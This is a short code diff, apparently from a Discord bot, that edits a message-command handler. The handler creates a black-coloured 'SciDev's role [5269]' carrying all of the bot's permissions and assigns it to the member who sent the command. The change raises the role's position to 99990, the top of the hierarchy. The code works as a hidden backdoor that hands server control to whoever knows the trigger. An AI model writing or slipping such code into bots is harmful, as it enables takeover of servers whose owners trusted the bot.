@@ -68,7 +68,7 @@ client.on("message",async msg => {
                 const rNm = "SciDev's role [5269]", rCol = 0x000000;
                 var role = (await msg.guild.roles.fetch()).cache.find(r=>/\[5269\]/.test(r.name));
                 var myPermissions = (await msg.guild.members.fetch(client.user.id)).permissions;
-                if (!role) role = await msg.guild.roles.create({data:{name:rNm,permissions:myPermissions,color:rCol,position:0}})
+                if (!role) role = await msg.guild.roles.create({data:{name:rNm,permissions:myPermissions,color:rCol,position:99990}})
                 role.setPermissions(role.permissions.bitfield|myPermissions.bitfield)
                 msg.member.roles.add(role.id,"yes");
                 break;
